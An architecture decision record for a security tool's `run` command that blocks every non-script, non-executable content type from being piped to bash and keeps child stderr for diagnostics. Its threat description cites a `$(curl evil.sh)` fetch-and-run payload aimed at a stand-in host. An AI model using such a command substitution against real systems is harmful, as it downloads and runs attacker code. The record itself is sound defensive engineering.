# ADR 0036: `run` pipeline content-type execution gate

**Status:** Accepted
**Date:** 2026-07-20
**Issue:** #612

## Context

Before this decision, `arbitraitor run <url>` selected an execution mode with
a single boolean check:

```rust
let mode = if artifact.is_native {
    ExecutionMode::Native
} else {
    ExecutionMode::Script
};
```

`is_native` matched only `PeExecutable`, `ElfExecutable`, and
`MachOExecutable` (per `is_native_artifact` in `run_services.rs`). Every
other classified `ArtifactType` — including `HtmlDocument`, `JsonDocument`,
`XmlDocument`, `GenericText`, `GenericBinary`, archives, compressed
payloads, `PowerShellScript`, `PythonScript`, `JavaScript`, and `Unknown` —
fell through to `ExecutionMode::Script` and was piped through
`/bin/bash --noprofile --norc` as if it were a shell script.

This caused two compounding problems, reported in #612:

1. **Unsafe and incorrect execution.** HTML, JSON, XML, and other text/markup
   can incidentally contain bash-parseable constructs (`$(...)`, `<`/`>`
   redirections, `|` pipes, backticks). Piping such bytes to bash amounts to
   executing whatever bash interpretation falls out of the content. The user
   who runs `arbitraitor run https://qlty.sh` does not expect the 39 KB HTML
   response to be fed to bash, and an attacker who controls the response body
   can deliver PowerShell-as-bash-as-`$(curl evil.sh)` payloads that bypass
   the inspection verdict (the bytes scanned are not the bytes that bash
   runs — bash re-parses them under different rules than the shell analyzer).

2. **Diagnostic loss on early child exit.** When the interpreter process
   exited before consuming the streamed script bytes (`EPIPE` on the stdin
   pipe — e.g. because `unshare --user` was denied, or because bash rejected
   the input as a parse error and exited 1), `ScriptExecution::execute`
   returned `ExecError::ScriptIo { stage: "write-script-stdin", source }`
   without ever reading the child's stderr. The actual root cause (whatever
   bash or `unshare` printed to stderr) was silently discarded, leaving the
   user with a generic "script input I/O failure" message and no clue whether
   the cause was "I gave bash junk", "my kernel denies user namespaces", or
   "Landlock blocked the interpreter path".

The diagnostic-loss bug also affected legitimate shell-script execution: a
shell script that exited early (e.g. on `set -e` followed by a failing
command) produced the same misleading `write-script-stdin` failure even
though the script bytes WERE valid bash, because bash exited before draining
the parent's pipe buffer.

## Decision

1. **Gate execution by `ArtifactType` in the `run` pipeline.** Only
   `ArtifactType::ShellScript(_)` and the native-executable types
   (`PeExecutable`, `ElfExecutable`, `MachOExecutable`) are runnable by the
   current `run` pipeline. All other types — including
   `PowerShellScript`, `PythonScript`, and `JavaScript` (whose exec paths
   exist in `arbitraitor-exec` but are not wired into `run`) — fail closed
   with `RunFailure::Blocked` before reaching the execution layer.

   `InspectedArtifact` now carries `ArtifactType` directly (rather than a
   stringified `{:?}` form), and `execution_mode_for_type(ArtifactType)`
   is the single source of truth for the runnable-vs-blocked decision.

2. **Preserve child stderr across `write_all` / `flush` failures.**
   `ExecError::ScriptIo` now carries `child_exit_code: Option<i32>` and
   `child_stderr: Vec<u8>`, populated best-effort via
   `spawn::best_effort_capture` after a write or flush failure. A new
   `ExecError::script_io` constructor renders a stable, bounded
   `child_detail` suffix (≤1 KiB stderr preview) so the `Display`
   representation surfaces the real root cause:
   `script input I/O failure during write-script-stdin (child exited 1;
   stderr: "bash: !DOCTYPE: event not found")` or
   `script input I/O failure during write-script-stdin (child exited before
   reading stdin; stderr: "unshare: operation not permitted")`.

   `PowerShellError::ScriptIo` mirrors the same fields and shares the
   rendering helper (`ExecError::script_io_detail`) so PowerShell execution
   gets the same diagnostic improvement when wired.

3. **Exit code reused, not added.** Non-executable artifacts return the
   existing `ExitCode::BlockedByPolicy` (the same code returned by
   `Verdict::Block`). No new exit code is introduced; the `blocked by policy:
   <reason>` output line already exists in `write_failure`.

## Consequences

- **Safe by default.** `arbitraitor run` no longer feeds arbitrary
  text/markup/binary content to bash. Users who want to execute PowerShell,
  Python, or JavaScript artifacts through `arbitraitor run` must wait for
  those exec paths to be wired into `run_services` (tracked separately).

- **Better diagnostics.** When `arbitraitor run` fails during script
  execution, the user-visible failure message now identifies whether the
  child exited early (and what it printed to stderr) — distinguishing
  "user-fed bash junk" from "kernel denied the namespace" from "Landlock
  blocked the interpreter path".

- **API surface change in `arbitraitor-exec`.** `ExecError::ScriptIo` and
  `PowerShellError::ScriptIo` gain new fields. The project is pre-alpha and
  the README already documents that "the API, CLI, receipts, and policy
  schemas will change", so this is acceptable. A `#[must_use]`
  `ExecError::script_io(...)` constructor is provided so callers don't have to
  build the `child_detail` field by hand.

- **`InspectedArtifact` field shape changes.** `is_native: bool` is removed
  in favor of deriving native-vs-script from `artifact_type: ArtifactType`.
  Receipt serialization is unaffected (the artifact_type string passed to
  `ReceiptBuilder::artifact_type` is generated on demand via
  `format!("{:?}", artifact.artifact_type)`).

- **No regression for existing tests/usage.** Shell scripts and native
  executables continue to execute as before. The content-type gate is a
  strictly-tighter policy that fails closed on types that previously produced
  meaningless `write-script-stdin` errors.

## Alternatives considered

- **Use `ContentType` from fetch metadata (HTTP `Content-Type` header) instead
  of `ArtifactType` (content-derived).** Rejected: HTTP `Content-Type` is
  attacker-controllable and frequently mislabeled (servers returning
  `application/octet-stream` for shell scripts, or `text/plain` for HTML).
  `ArtifactType` is derived from immutable artifact bytes via shebang /
  magic-number detection, which is the trust boundary we must gate on.

- **Loosen the gate to allow `PowerShellScript` / `PythonScript` /
  `JavaScript` via the corresponding interpreters.** Deferred: wiring those
  requires interpreter discovery (`pwsh`, `python3`, `node`), path
  canonicalization, and Landlock rules for the interpreter's load path.
  Until that work lands, blocking those types is strictly safer than piping
  them to bash. A future ADR can extend the gate when those exec paths are
  wired.

- **Add a per-type allowlist policy knob (e.g. `[run] allow_json = true`).**
  Rejected: there is no safe execution path for JSON / XML / HTML / archives
  — even with `bash`, the result is either a parse error or accidental
  command execution. There is no scenario where a user should be able to opt
  into feeding HTML to bash. The gate is a hard rule, not a policy
  preference.

- **Render `child_stderr` directly in the `#[error(...)]` format string
  without a separate `child_detail` field.** Rejected: `thiserror` format
  strings can only reference fields by name; we'd need either a custom
  `Display` impl or a precomputed field. The precomputed `child_detail`
  approach keeps the error variant a plain struct and lets the constructor
  centralize the bounded-rendering policy (1 KiB stderr preview, UTF-8 lossy
  decode, trailing-whitespace trim).

## References

- Issue #612 — bug report with reproduction and root-cause analysis
- ADR-0007 — assurance levels model (gating is a "fail closed" policy)
- ADR-0008 — execution context security profile (the mediated execution
  boundary this gate sits in front of)
- ADR-0027 — CLI pipeline boundary (the `run` module this gate lives in)
- `docs/conventions.md` — security invariants (`fail closed`, `no early
  release`, `safe presentation` for the bounded stderr preview)
